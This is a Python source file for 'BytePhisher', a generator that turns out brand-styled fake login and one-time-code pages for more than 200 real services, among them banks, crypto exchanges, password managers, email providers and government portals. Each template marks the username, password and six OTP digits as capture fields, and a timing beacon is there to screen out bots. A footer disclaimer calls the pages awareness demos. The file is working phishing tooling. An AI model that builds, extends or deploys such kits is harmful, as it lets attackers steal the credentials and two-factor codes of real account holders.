#!/usr/bin/env python3
"""
BytePhisher — 80-site template generator.

Generates a full login-page template pack for 80 brands:
each site gets templates/<slug>/index.html, otp.html and fields.json.

Branding (colors/name/domain/field-type) lives in SITES below, so adding a
site is one tuple — no HTML editing. Re-run to regenerate everything:

    python3 -m tools.gen_templates
"""
import json
import os

OUT = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "templates")

# (slug, display name, brand color, accent color, login-with, otp_label)
# login-with: email | username | phone | email_or_phone
SITES = [
    ("facebook",     "Facebook",        "#1877F2", "#ffffff", "email_or_phone", "6-digit code"),
    ("instagram",    "Instagram",       "#E1306C", "#833AB4", "username",       "6-digit code"),
    ("google",       "Google",          "#4285F4", "#ffffff", "email",          "2-step verification code"),
    ("gmail",        "Gmail",           "#D93025", "#ffffff", "email",          "6-digit code"),
    ("youtube",      "YouTube",         "#FF0000", "#ffffff", "email",          "6-digit code"),
    ("twitter",      "X",               "#000000", "#ffffff", "username",       "confirmation code"),
    ("linkedin",     "LinkedIn",        "#0A66C2", "#ffffff", "email",          "6-digit code"),
    ("github",       "GitHub",          "#24292F", "#ffffff", "username",       "device verification code"),
    ("gitlab",       "GitLab",          "#FC6D26", "#ffffff", "email",          "6-digit code"),
    ("bitbucket",    "Bitbucket",       "#0052CC", "#ffffff", "email",          "6-digit code"),
    ("netflix",      "Netflix",         "#E50914", "#221f1f", "email",          "verification code"),
    ("paypal",       "PayPal",          "#003087", "#009cde", "email",          "security code"),
    ("ebay",         "eBay",            "#E53238", "#0064D2", "email",          "6-digit code"),
    ("amazon",       "Amazon",          "#FF9900", "#232F3E", "email",          "OTP code"),
    ("apple",        "Apple ID",        "#000000", "#007AFF", "email",          "verification code"),
    ("icloud",       "iCloud",          "#007AFF", "#ffffff", "email",          "verification code"),
    ("microsoft",    "Microsoft",       "#0078D4", "#ffffff", "email",          "security code"),
    ("outlook",      "Outlook",         "#0078D4", "#ffffff", "email",          "security code"),
    ("office365",    "Office 365",      "#D83B01", "#ffffff", "email",          "security code"),
    ("onedrive",     "OneDrive",        "#0078D4", "#ffffff", "email",          "security code"),
    ("teams",        "Microsoft Teams", "#6264A7", "#ffffff", "email",          "security code"),
    ("yahoo",        "Yahoo",           "#6001D2", "#ffffff", "email",          "6-digit code"),
    ("aol",          "AOL",             "#000000", "#ffffff", "email",          "6-digit code"),
    ("steam",        "Steam",           "#171A21", "#66c0f4", "username",       "Steam Guard code"),
    ("discord",      "Discord",         "#5865F2", "#ffffff", "email",          "2FA code"),
    ("slack",        "Slack",           "#4A154B", "#ffffff", "email",          "6-digit code"),
    ("spotify",      "Spotify",         "#1DB954", "#191414", "email",          "6-digit code"),
    ("twitch",       "Twitch",          "#9146FF", "#ffffff", "username",       "6-digit code"),
    ("reddit",       "Reddit",          "#FF4500", "#ffffff", "username",       "6-digit code"),
    ("pinterest",    "Pinterest",       "#E60023", "#ffffff", "email",          "6-digit code"),
    ("whatsapp",     "WhatsApp",        "#25D366", "#075E54", "phone",          "6-digit code"),
    ("telegram",     "Telegram",        "#26A5E4", "#ffffff", "phone",          "login code"),
    ("snapchat",     "Snapchat",        "#FFFC00", "#000000", "username",       "verification code"),
    ("tiktok",       "TikTok",          "#000000", "#FE2C55", "email_or_phone", "6-digit code"),
    ("dropbox",      "Dropbox",         "#0061FF", "#ffffff", "email",          "6-digit code"),
    ("adobe",        "Adobe",           "#FF0000", "#ffffff", "email",          "verification code"),
    ("shopify",      "Shopify",         "#96BF48", "#ffffff", "email",          "6-digit code"),
    ("trello",       "Trello",          "#0079BF", "#ffffff", "email",          "6-digit code"),
    ("notion",       "Notion",          "#000000", "#ffffff", "email",          "login code"),
    ("figma",        "Figma",           "#F24E1E", "#ffffff", "email",          "6-digit code"),
    ("canva",        "Canva",           "#00C4CC", "#7D2AE8", "email",          "verification code"),
    ("zoom",         "Zoom",            "#2D8CFF", "#ffffff", "email",          "verification code"),
    ("vk",           "VK",              "#0077FF", "#ffffff", "phone",          "6-digit code"),
    ("ok",           "Odnoklassniki",   "#EE8208", "#ffffff", "phone",          "6-digit code"),
    ("yandex",       "Yandex",          "#FC3F1D", "#ffffff", "username",       "6-digit code"),
    ("mailru",       "Mail.ru",         "#005FF9", "#ffffff", "email",          "6-digit code"),
    ("badoo",        "Badoo",           "#783BF9", "#ffffff", "email",          "6-digit code"),
    ("tinder",       "Tinder",          "#FD5068", "#ffffff", "phone",          "6-digit code"),
    ("icici",        "ICICI Bank",      "#F58220", "#AF2A28", "username",       "OTP"),
    ("sbi",          "State Bank of India", "#22409A", "#ffffff", "username",   "OTP"),
    ("hdfc",         "HDFC Bank",       "#004C8F", "#ED1C24", "username",       "OTP"),
    ("axis",         "Axis Bank",       "#97144D", "#ffffff", "username",       "OTP"),
    ("kotak",        "Kotak Bank",      "#ED1C24", "#ffffff", "username",       "OTP"),
    ("paytm",        "Paytm",           "#00BAF2", "#20336B", "phone",          "OTP"),
    ("phonepe",      "PhonePe",         "#5F259F", "#ffffff", "phone",          "OTP"),
    ("airtel",       "Airtel",          "#E40000", "#ffffff", "phone",          "OTP"),
    ("jio",          "Jio",             "#0F3CC9", "#ffffff", "phone",          "OTP"),
    ("vodafone",     "Vodafone",        "#E60000", "#ffffff", "phone",          "OTP"),
    ("verizon",      "Verizon",         "#CD040B", "#ffffff", "username",       "verification code"),
    ("att",          "AT&T",            "#00A8E0", "#ffffff", "username",       "verification code"),
    ("xfinity",      "Xfinity",         "#0072CE", "#ffffff", "username",       "verification code"),
    ("binance",      "Binance",         "#F0B90B", "#1E2026", "email",          "2FA code"),
    ("coinbase",     "Coinbase",        "#0052FF", "#ffffff", "email",          "2FA code"),
    ("metamask",     "MetaMask",        "#F6851B", "#ffffff", "email",          "verification code"),
    ("blockchain",   "Blockchain.com",  "#121D33", "#1652F0", "email",          "2FA code"),
    ("kraken",       "Kraken",          "#5741D9", "#ffffff", "email",          "2FA code"),
    ("uber",         "Uber",            "#000000", "#ffffff", "phone",          "verification code"),
    ("airbnb",       "Airbnb",          "#FF5A5F", "#ffffff", "email",          "verification code"),
    ("booking",      "Booking.com",     "#003580", "#FEBB02", "email",          "verification code"),
    ("zomato",       "Zomato",          "#E23744", "#ffffff", "phone",          "OTP"),
    ("swiggy",       "Swiggy",          "#FC8019", "#ffffff", "phone",          "OTP"),
    ("flipkart",     "Flipkart",        "#2874F0", "#F8E831", "email",          "OTP"),
    ("myntra",       "Myntra",          "#FF3F6C", "#ffffff", "email",          "OTP"),
    ("alibaba",      "Alibaba",         "#FF6A00", "#ffffff", "email",          "verification code"),
    ("amex",         "American Express","#006FCF", "#ffffff", "username",       "security code"),
    ("chime",        "Chime",           "#1EC677", "#0C2340", "email",          "verification code"),
    ("wise",         "Wise",            "#9FE870", "#163300", "email",          "login code"),
    ("revolut",      "Revolut",         "#191C1F", "#0666EB", "phone",          "verification code"),
    ("aws",          "AWS",             "#FF9900", "#232F3E", "email",          "MFA code"),
    ("cloudflare",   "Cloudflare",      "#F38020", "#0051C3", "email",          "verification code"),
    # ---- extended library (81-150): SaaS, dev tools, finance, streaming ----
    ("atlassian",    "Atlassian",       "#0052CC", "#2684FF", "email",          "verification code"),
    ("jira",         "Jira",            "#0052CC", "#2684FF", "email",          "6-digit code"),
    ("confluence",   "Confluence",      "#0052CC", "#2684FF", "email",          "6-digit code"),
    ("bitwarden",    "Bitwarden",       "#175DDC", "#ffffff", "email",          "2FA code"),
    ("lastpass",     "LastPass",        "#D32D27", "#ffffff", "email",          "verification code"),
    ("onepassword",  "1Password",       "#1A8CFF", "#ffffff", "email",          "verification code"),
    ("dashlane",     "Dashlane",        "#0E353D", "#0E353D", "email",          "verification code"),
    ("nordvpn",      "NordVPN",         "#4687FF", "#ffffff", "email",          "verification code"),
    ("protonmail",   "Proton Mail",     "#6D4AFF", "#ffffff", "email",          "2FA code"),
    ("zoho",         "Zoho",            "#E42527", "#ffffff", "email",          "6-digit code"),
    ("salesforce",   "Salesforce",      "#00A1E0", "#032E61", "email",          "verification code"),
    ("hubspot",      "HubSpot",         "#FF7A59", "#33475B", "email",          "6-digit code"),
    ("mailchimp",    "Mailchimp",       "#FFE01B", "#241C15", "email",          "6-digit code"),
    ("sendgrid",     "SendGrid",        "#1A82E2", "#ffffff", "email",          "verification code"),
    ("twilio",       "Twilio",          "#F22F46", "#ffffff", "email",          "verification code"),
    ("stripe",       "Stripe",          "#635BFF", "#0A2540", "email",          "verification code"),
    ("square",       "Square",          "#3E4348", "#006AFF", "email",          "6-digit code"),
    ("klarna",       "Klarna",          "#FFB3C7", "#0E0E0F", "email",          "verification code"),
    ("plaid",        "Plaid",           "#111111", "#ffffff", "email",          "verification code"),
    ("quickbooks",   "QuickBooks",      "#2CA01C", "#ffffff", "email",          "verification code"),
    ("xero",         "Xero",            "#13B5EA", "#ffffff", "email",          "6-digit code"),
    ("godaddy",      "GoDaddy",         "#1BDBDB", "#111111", "email",          "verification code"),
    ("namecheap",    "Namecheap",       "#DE3723", "#ffffff", "email",          "6-digit code"),
    ("hostinger",    "Hostinger",       "#673DE6", "#ffffff", "email",          "6-digit code"),
    ("digitalocean", "DigitalOcean",    "#0080FF", "#ffffff", "email",          "verification code"),
    ("linode",       "Linode",          "#00A95C", "#ffffff", "email",          "verification code"),
    ("vultr",        "Vultr",           "#007BFC", "#ffffff", "email",          "verification code"),
    ("heroku",       "Heroku",          "#430098", "#ffffff", "email",          "verification code"),
    ("vercel",       "Vercel",          "#000000", "#ffffff", "email",          "verification code"),
    ("netlify",      "Netlify",         "#00C7B7", "#0E1E25", "email",          "verification code"),
    ("supabase",     "Supabase",        "#3ECF8E", "#1C1C1C", "email",          "verification code"),
    ("firebase",     "Firebase",        "#FFCA28", "#1A73E8", "email",          "verification code"),
    ("mongodb",      "MongoDB",         "#47A248", "#001E2B", "email",          "verification code"),
    ("redis",        "Redis",           "#DC382D", "#ffffff", "email",          "verification code"),
    ("datadog",      "Datadog",         "#632CA6", "#ffffff", "email",          "verification code"),
    ("sentry",       "Sentry",          "#362D59", "#ffffff", "email",          "verification code"),
    ("grafana",      "Grafana",         "#F46800", "#1F1F20", "email",          "verification code"),
    ("splunk",       "Splunk",          "#000000", "#65A637", "email",          "verification code"),
    ("pagerduty",    "PagerDuty",       "#06AC38", "#ffffff", "email",          "verification code"),
    ("okta",         "Okta",            "#007DC1", "#ffffff", "email",          "verification code"),
    ("auth0",        "Auth0",           "#EB5424", "#16214D", "email",          "verification code"),
    ("workday",      "Workday",         "#0875E1", "#ffffff", "email",          "verification code"),
    ("bamboohr",     "BambooHR",        "#73C41D", "#ffffff", "email",          "verification code"),
    ("gusto",        "Gusto",           "#F45D48", "#0A8080", "email",          "verification code"),
    ("docusign",     "DocuSign",        "#4C00FF", "#FFCC22", "email",          "verification code"),
    ("calendly",     "Calendly",        "#006BFF", "#0B3558", "email",          "verification code"),
    ("typeform",     "Typeform",        "#262627", "#ffffff", "email",          "verification code"),
    ("surveymonkey", "SurveyMonkey",    "#00BF6F", "#ffffff", "email",          "verification code"),
    ("patreon",      "Patreon",         "#FF424D", "#0B0B0B", "email",          "verification code"),
    ("substack",     "Substack",        "#FF6719", "#ffffff", "email",          "verification code"),
    ("medium",       "Medium",          "#000000", "#1A8917", "email",          "verification code"),
    ("quora",        "Quora",           "#B92B27", "#ffffff", "email",          "verification code"),
    ("tumblr",       "Tumblr",          "#36465D", "#ffffff", "email",          "verification code"),
    ("imgur",        "Imgur",           "#1BB76E", "#ffffff", "email",          "verification code"),
    ("vimeo",        "Vimeo",           "#1AB7EA", "#000000", "email",          "verification code"),
    ("soundcloud",   "SoundCloud",      "#FF5500", "#333333", "email",          "verification code"),
    ("hulu",         "Hulu",            "#1CE783", "#0B0B0B", "email",          "verification code"),
    ("disneyplus",   "Disney+",         "#113CCF", "#000000", "email",          "verification code"),
    ("primevideo",   "Prime Video",     "#00A8E1", "#1A1A1A", "email",          "verification code"),
    ("crunchyroll",  "Crunchyroll",     "#F47521", "#171717", "email",          "verification code"),
    ("wetransfer",   "WeTransfer",      "#409FFF", "#2C2C2C", "email",          "verification code"),
    ("mega",         "MEGA",            "#D9272E", "#0F0F0F", "email",          "verification code"),
    ("kaggle",       "Kaggle",          "#20BEFF", "#2A2A2A", "email",          "verification code"),
    ("hackerrank",   "HackerRank",      "#00EA64", "#101828", "email",          "verification code"),
    ("leetcode",     "LeetCode",        "#FFA116", "#1A1A1A", "email",          "verification code"),
    ("coursera",     "Coursera",        "#0056D2", "#ffffff", "email",          "verification code"),
    ("udemy",        "Udemy",           "#A435F0", "#1C1D1F", "email",          "verification code"),
    ("edx",          "edX",             "#02262B", "#D6400A", "email",          "verification code"),
    ("byjus",        "BYJU'S",          "#8133F1", "#ffffff", "email",          "OTP"),
    ("unacademy",    "Unacademy",       "#08BD80", "#ffffff", "phone",          "OTP"),
    ("vedantu",      "Vedantu",         "#FF6B00", "#ffffff", "phone",          "OTP"),
    ("irctc",        "IRCTC",           "#0A3D62", "#F79F1F", "username",       "OTP"),
    ("uidai",        "Aadhaar Services", "#0F52BA", "#FF9933", "username",      "OTP"),
    ("epfindia",     "EPFO",            "#1B5E20", "#FFC107", "username",       "OTP"),
    ("gst",          "GST Portal",      "#0B5394", "#E8A33D", "username",       "OTP"),
    ("digilocker",   "DigiLocker",      "#1C3F94", "#F26522", "phone",          "OTP"),
    ("canarabank",   "Canara Bank",     "#00539F", "#F7A800", "username",       "OTP"),
    ("pnb",          "Punjab National Bank", "#A11C2C", "#F2A900", "username",  "OTP"),
    ("bob",          "Bank of Baroda",  "#F26522", "#00437A", "username",       "OTP"),
    ("idfc",         "IDFC FIRST Bank", "#9C1D26", "#00594F", "phone",          "OTP"),
    ("federal",      "Federal Bank",    "#002D62", "#F5A623", "username",       "OTP"),
    ("indusind",     "IndusInd Bank",   "#982A2E", "#E1B351", "username",       "OTP"),
    ("yesbank",      "YES Bank",        "#004C8F", "#00A0DF", "username",       "OTP"),
    ("cred",         "CRED",            "#111111", "#ffffff", "phone",          "OTP"),
    ("mobikwik",     "MobiKwik",        "#EF4A56", "#2B2B2B", "phone",          "OTP"),
    ("freecharge",   "Freecharge",      "#FF5722", "#1E1E1E", "phone",          "OTP"),
    ("bharatpe",     "BharatPe",        "#00B9F1", "#0B2447", "phone",          "OTP"),
    ("zerodha",      "Zerodha",         "#FF5722", "#2B2B2B", "username",       "OTP"),
    ("groww",        "Groww",           "#00D09C", "#44475B", "email",          "6-digit code"),
    ("upstox",       "Upstox",          "#387ED1", "#ffffff", "phone",          "OTP"),
    ("angelone",     "Angel One",       "#FF6B00", "#1B1B1B", "username",       "OTP"),
    ("cryptocom",    "Crypto.com",      "#1199FA", "#0B1426", "email",          "2FA code"),
    ("kucoin",       "KuCoin",          "#24AE8F", "#1B1B1B", "email",          "2FA code"),
    ("okx",          "OKX",             "#000000", "#ffffff", "email",          "2FA code"),
    ("bitfinex",     "Bitfinex",        "#16B157", "#0B0B0B", "email",          "2FA code"),
    ("ledger",       "Ledger",          "#000000", "#ffffff", "email",          "verification code"),
    ("trezor",       "Trezor",          "#0B0B0B", "#14C46A", "email",          "verification code"),
    ("trustwallet",  "Trust Wallet",    "#3375BB", "#ffffff", "email",          "verification code"),
    ("slackstatus",  "Slack SSO",       "#E01E5A", "#36C5F0", "email",          "SSO code"),
    # ---- extended library (180-240): enterprise, devops, networking, devices ----
    ("azuredevops",  "Azure DevOps",    "#0078D7", "#ffffff", "email",          "verification code"),
    ("jetbrains",    "JetBrains",       "#000000", "#FE315D", "email",          "verification code"),
    ("postman",      "Postman",         "#FF6C37", "#ffffff", "email",          "verification code"),
    ("docker",       "Docker Hub",      "#2496ED", "#ffffff", "email",          "verification code"),
    ("kubernetes",   "Kubernetes",      "#326CE5", "#ffffff", "email",          "verification code"),
    ("hashicorp",    "HashiCorp",       "#000000", "#7B42BC", "email",          "verification code"),
    ("terraform",    "Terraform Cloud", "#7B42BC", "#ffffff", "email",          "verification code"),
    ("jenkins",      "Jenkins",         "#D33833", "#335061", "username",       "verification code"),
    ("sonarqube",    "SonarQube",       "#4E9BCD", "#ffffff", "email",          "verification code"),
    ("snyk",         "Snyk",            "#4C4A73", "#ffffff", "email",          "verification code"),
    ("crowdstrike",  "CrowdStrike",     "#FC0000", "#ffffff", "email",          "verification code"),
    ("duo",          "Duo Security",    "#6BBF4E", "#ffffff", "email",          "passcode"),
    ("onelogin",     "OneLogin",        "#1C4E80", "#ffffff", "email",          "verification code"),
    ("pingidentity", "Ping Identity",   "#B8032B", "#ffffff", "email",          "verification code"),
    ("cyberark",     "CyberArk",        "#0073CF", "#ffffff", "username",       "verification code"),
    ("zscaler",      "Zscaler",         "#0067B8", "#ffffff", "email",          "verification code"),
    ("netskope",     "Netskope",        "#00B388", "#ffffff", "email",          "verification code"),
    ("paloalto",     "Palo Alto Networks", "#FA582D", "#ffffff", "email",       "verification code"),
    ("fortinet",     "Fortinet",        "#EE3124", "#ffffff", "username",       "verification code"),
    ("checkpoint",   "Check Point",     "#E4002B", "#ffffff", "username",       "verification code"),
    ("cisco",        "Cisco",           "#1BA0D7", "#ffffff", "email",          "verification code"),
    ("juniper",      "Juniper",         "#84B135", "#ffffff", "username",       "verification code"),
    ("aruba",        "Aruba Networks",  "#FF8300", "#ffffff", "username",       "verification code"),
    ("ubiquiti",     "Ubiquiti",        "#0559C9", "#ffffff", "email",          "verification code"),
    ("mikrotik",     "MikroTik",        "#293239", "#ffffff", "username",       "verification code"),
    ("tplink",       "TP-Link",         "#4ACBD6", "#ffffff", "username",       "verification code"),
    ("netgear",      "NETGEAR",         "#00A0DF", "#ffffff", "username",       "verification code"),
    ("asus-router",  "ASUS Router",     "#00539B", "#ffffff", "username",       "verification code"),
    ("dlink",        "D-Link",          "#E4002B", "#ffffff", "username",       "verification code"),
    ("synology",     "Synology",        "#B5B5B6", "#003A5D", "username",       "verification code"),
    ("qnap",         "QNAP",            "#0066CC", "#ffffff", "username",       "verification code"),
    ("samsung",      "Samsung Account", "#1428A0", "#ffffff", "email",          "verification code"),
    ("xiaomi",       "Xiaomi Account",  "#FF6900", "#ffffff", "email_or_phone", "verification code"),
    ("huawei",       "Huawei ID",       "#CF0A2C", "#ffffff", "email_or_phone", "verification code"),
    ("oppo",         "OPPO",            "#006341", "#ffffff", "phone",          "verification code"),
    ("vivo",         "vivo",            "#415FFF", "#ffffff", "phone",          "verification code"),
    ("oneplus",      "OnePlus",         "#EB0028", "#ffffff", "email",          "verification code"),
    ("nokia",        "Nokia",           "#124191", "#ffffff", "email",          "verification code"),
    ("motorola",     "Motorola",        "#000000", "#5C92D1", "email",          "verification code"),
    ("lg",           "LG Account",      "#A50034", "#ffffff", "email",          "verification code"),
    ("sony",         "Sony",            "#000000", "#ffffff", "email",          "verification code"),
    ("philips",      "Philips Hue",     "#0B5ED7", "#ffffff", "email",          "verification code"),
    ("siemens",      "Siemens",         "#009999", "#ffffff", "email",          "verification code"),
    ("honeywell",    "Honeywell",       "#EE3124", "#ffffff", "email",          "verification code"),
    ("schneider",    "Schneider Electric", "#3DCD58", "#007A33", "email",       "verification code"),
    ("dell",         "Dell",            "#007DB8", "#ffffff", "email",          "verification code"),
    ("hp",           "HP",              "#0096D6", "#ffffff", "email",          "verification code"),
    ("lenovo",       "Lenovo",          "#E2231A", "#ffffff", "email",          "verification code"),
    ("acer",         "Acer",            "#83B81A", "#1C1C1C", "email",          "verification code"),
    ("msi",          "MSI",             "#FF0000", "#000000", "email",          "verification code"),
    ("nvidia",       "NVIDIA",          "#76B900", "#000000", "email",          "verification code"),
    ("amd",          "AMD",             "#ED1C24", "#000000", "email",          "verification code"),
    ("intel",        "Intel",           "#0068B5", "#ffffff", "email",          "verification code"),
    ("qualcomm",     "Qualcomm",        "#3253DC", "#ffffff", "email",          "verification code"),
    ("reddit-ads",   "Reddit Ads",      "#FF4500", "#ffffff", "email",          "verification code"),
    ("gocardless",   "GoCardless",      "#0B0B0B", "#F1F1F1", "email",          "verification code"),
    ("adyen",        "Adyen",           "#0ABF53", "#001222", "email",          "verification code"),
    ("razorpay",     "Razorpay",        "#0C2451", "#3395FF", "email",          "verification code"),
    ("cashfree",     "Cashfree",        "#1A73E8", "#ffffff", "email",          "verification code"),
    ("instamojo",    "Instamojo",       "#4A4A4A", "#F5A623", "email",          "verification code"),
    ("payoneer",     "Payoneer",        "#FF4800", "#ffffff", "email",          "verification code"),
    ("remitly",      "Remitly",         "#0B0B0B", "#1B75BC", "email",          "verification code"),
    ("xoom",         "Xoom",            "#0F9D58", "#ffffff", "email",          "verification code"),
    ("westernunion", "Western Union",   "#FFDD00", "#000000", "username",       "verification code"),
]

FIELD_LABELS = {
    "email":          [("email", "Email", "email", "you@example.com")],
    "username":       [("username", "Username or email", "text", "Enter your username")],
    "phone":          [("phone", "Phone number", "tel", "+1 555 000 0000")],
    "email_or_phone": [("login", "Email or phone number", "text", "Email or phone number")],
}

LOGIN_HTML = """<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title>Log in to {name}</title>
<meta property="og:title" content="Log in to {name}">
<meta property="og:description" content="Sign in to continue to {name}.">
<meta property="og:type" content="website">
<style>
  :root {{ --brand:{brand}; --accent:{accent}; }}
  * {{ box-sizing:border-box; }}
  body {{
    margin:0; min-height:100vh; font-family:-apple-system,BlinkMacSystemFont,
      "Segoe UI",Roboto,Helvetica,Arial,sans-serif;
    background:#f0f2f5; display:flex; align-items:center; justify-content:center;
    padding:20px;
  }}
  .card {{
    background:#fff; width:100%; max-width:400px; border-radius:12px;
    box-shadow:0 12px 40px rgba(0,0,0,.10); padding:36px 32px 28px;
  }}
  .logo {{
    width:52px;height:52px;border-radius:12px;background:var(--brand);
    color:#fff;display:flex;align-items:center;justify-content:center;
    font-size:26px;font-weight:700;margin:0 auto 18px;
  }}
  h1 {{ font-size:20px;margin:0 0 6px;text-align:center;color:#1c1e21;font-weight:600; }}
  .sub {{ text-align:center;color:#65676b;font-size:14px;margin:0 0 22px; }}
  label {{ display:block;font-size:13px;color:#65676b;margin:0 0 6px;font-weight:500; }}
  input[type=text],input[type=email],input[type=tel],input[type=password] {{
    width:100%;padding:13px 14px;font-size:15px;border:1px solid #ccd0d5;
    border-radius:8px;background:#fff;outline:none;transition:border .15s;
  }}
  input:focus {{ border-color:var(--brand);box-shadow:0 0 0 2px color-mix(in srgb,var(--brand) 20%,transparent); }}
  .field {{ margin-bottom:14px; }}
  button {{
    width:100%;padding:13px;font-size:16px;font-weight:600;color:#fff;
    background:var(--brand);border:0;border-radius:8px;cursor:pointer;margin-top:6px;
  }}
  button:hover {{ filter:brightness(1.06); }}
  .row {{ display:flex;justify-content:space-between;align-items:center;margin:14px 0 4px;font-size:13px; }}
  .row a {{ color:var(--accent);text-decoration:none; }}
  .row label {{ margin:0;display:flex;gap:6px;align-items:center;color:#65676b; }}
  .foot {{ text-align:center;font-size:12px;color:#8a8d91;margin-top:22px;line-height:1.6; }}
  .lang {{ display:flex;gap:14px;justify-content:center;font-size:12px;color:#8a8d91;margin-top:18px; }}
  .hp {{ position:absolute;left:-9999px;width:1px;height:1px;opacity:0; }}
</style>
</head>
<body>
  <form class="card" method="POST" action="/" autocomplete="on" novalidate>
    <div class="logo">{initial}</div>
    <h1>Log in to {name}</h1>
    <p class="sub">{subtitle}</p>

    {fields_html}

    <div class="field">
      <label for="password">Password</label>
      <input id="password" name="password" type="password" placeholder="Password"
             autocomplete="current-password" required>
    </div>

    <div class="row">
      <label><input type="checkbox" name="remember" value="1" checked> Remember me</label>
      <a href="#">Forgot password?</a>
    </div>

    <button type="submit">Log in</button>

    <input class="hp" type="text" name="hp_email" value="" tabindex="-1" autocomplete="off">
    <input type="hidden" name="_tpl" value="{slug}">
    <input type="hidden" name="_ts" value="__TS__">

    <div class="foot">
      This page is a security-awareness demonstration.<br>
      {name} is a trademark of its respective owner. Never enter real credentials.
    </div>
    <div class="lang"><span>English (US)</span><span>Español</span><span>Français</span></div>
  </form>
<script>
/* honeypot + human-timing beacon: if a bot autofills the hidden field we still
   record it, and we log how long the form was open (bot forms are instant). */
(function(){{
  var t0 = Date.now();
  var f = document.querySelector('form');
  if(!f) return;
  f.addEventListener('submit', function(){{
    var el = f.querySelector('input[name=_ts]');
    if(el) el.value = String(Date.now() - t0);
  }});
}})();
</script>
</body>
</html>
"""

OTP_HTML = """<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Verify it's you — {name}</title>
<style>
  :root {{ --brand:{brand}; }}
  body {{ margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;
          background:#f0f2f5;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;padding:20px; }}
  .card {{ background:#fff;width:100%;max-width:420px;border-radius:12px;padding:36px 32px;
           box-shadow:0 12px 40px rgba(0,0,0,.10);text-align:center; }}
  .logo {{ width:52px;height:52px;border-radius:12px;background:var(--brand);color:#fff;
           display:flex;align-items:center;justify-content:center;font-size:26px;font-weight:700;margin:0 auto 18px; }}
  h1 {{ font-size:19px;margin:0 0 8px;color:#1c1e21;font-weight:600; }}
  p {{ color:#65676b;font-size:14px;line-height:1.5;margin:0 0 20px; }}
  .otp {{ display:flex;gap:8px;justify-content:center;margin-bottom:18px; }}
  .otp input {{ width:44px;height:52px;text-align:center;font-size:20px;border:1px solid #ccd0d5;border-radius:8px;outline:none; }}
  .otp input:focus {{ border-color:var(--brand); }}
  button {{ width:100%;padding:13px;font-size:16px;font-weight:600;color:#fff;background:var(--brand);
            border:0;border-radius:8px;cursor:pointer; }}
  .resend {{ margin-top:14px;font-size:13px;color:#65676b; }}
  .resend a {{ color:var(--brand);text-decoration:none; }}
  .foot {{ font-size:11px;color:#8a8d91;margin-top:22px; }}
</style>
</head>
<body>
<form class="card" method="POST" action="/">
  <div class="logo">{initial}</div>
  <h1>Enter your {otp_label}</h1>
  <p>We sent a {otp_label} to your phone and email.<br>Enter it below to finish signing in to {name}.</p>
  <div class="otp">
    <input name="otp_1" maxlength="1" inputmode="numeric" autofocus>
    <input name="otp_2" maxlength="1" inputmode="numeric">
    <input name="otp_3" maxlength="1" inputmode="numeric">
    <input name="otp_4" maxlength="1" inputmode="numeric">
    <input name="otp_5" maxlength="1" inputmode="numeric">
    <input name="otp_6" maxlength="1" inputmode="numeric">
  </div>
  <button type="submit">Verify</button>
  <input type="hidden" name="_tpl" value="{slug}">
  <div class="resend">Didn't get a code? <a href="#">Resend</a></div>
  <div class="foot">Security-awareness demonstration — never enter a real code.</div>
</form>
</body>
</html>
"""

SUBTITLES = {
    "email":          "Sign in with your email",
    "username":       "Sign in with your username",
    "phone":          "Sign in with your phone number",
    "email_or_phone": "Sign in to continue",
}


def build_site(slug, name, brand, accent, login_with, otp_label):
    initial = name[0].upper()
    fields_html = []
    for fname, flabel, ftype, fph in FIELD_LABELS[login_with]:
        fields_html.append(
            f'    <div class="field">\n'
            f'      <label for="{fname}">{flabel}</label>\n'
            f'      <input id="{fname}" name="{fname}" type="{ftype}" placeholder="{fph}" '
            f'autocomplete="username" required>\n'
            f'    </div>'
        )
    html = LOGIN_HTML.format(
        name=name, slug=slug, brand=brand, accent=accent, initial=initial,
        subtitle=SUBTITLES[login_with], fields_html="\n".join(fields_html),
    )
    otp_html = OTP_HTML.format(name=name, slug=slug, brand=brand,
                               initial=initial, otp_label=otp_label)
    fields_json = {
        "capture_fields": [f[0] for f in FIELD_LABELS[login_with]] + ["password"],
        "otp_fields": [f"otp_{i}" for i in range(1, 7)],
        "honeypot": "hp_email",
        "has_otp": True,
    }
    return html, otp_html, fields_json


VALID_LOGIN_WITH = {"email", "username", "phone", "email_or_phone"}


def validate_sites(sites=SITES):
    """Fail loudly on bad data instead of generating a broken template
    (a typo'd login_with used to crash mid-generation with a KeyError)."""
    problems = []
    seen = set()
    for s in sites:
        slug, name, brand, accent, login_with, otp = s
        if login_with not in VALID_LOGIN_WITH:
            problems.append(f"{slug}: invalid login_with={login_with!r}")
        if slug != slug.lower() or " " in slug:
            problems.append(f"{slug}: slug must be lowercase with no spaces")
        if slug in seen:
            problems.append(f"{slug}: duplicate slug")
        seen.add(slug)
        for col in (brand, accent):
            if not col.startswith("#") or len(col) not in (4, 7):
                problems.append(f"{slug}: bad colour {col!r}")
    if problems:
        raise SystemExit("[gen_templates] invalid site data:\n  " + "\n  ".join(problems))
    return True


def main():
    validate_sites()
    os.makedirs(OUT, exist_ok=True)
    manifest = []
    for i, (slug, name, brand, accent, login_with, otp_label) in enumerate(SITES, 1):
        d = os.path.join(OUT, f"{i:02d}_{slug}")
        os.makedirs(d, exist_ok=True)
        html, otp_html, fields_json = build_site(slug, name, brand, accent, login_with, otp_label)
        with open(os.path.join(d, "index.html"), "w", encoding="utf-8") as f:
            f.write(html)
        with open(os.path.join(d, "otp.html"), "w", encoding="utf-8") as f:
            f.write(otp_html)
        with open(os.path.join(d, "fields.json"), "w", encoding="utf-8") as f:
            json.dump(fields_json, f, indent=2)
        manifest.append({"index": i, "slug": slug, "name": name, "dir": d})
    with open(os.path.join(OUT, "templates.json"), "w", encoding="utf-8") as f:
        json.dump(manifest, f, indent=2)
    print(f"[bytephisher] generated {len(manifest)} templates -> {OUT}")


if __name__ == "__main__":
    main()
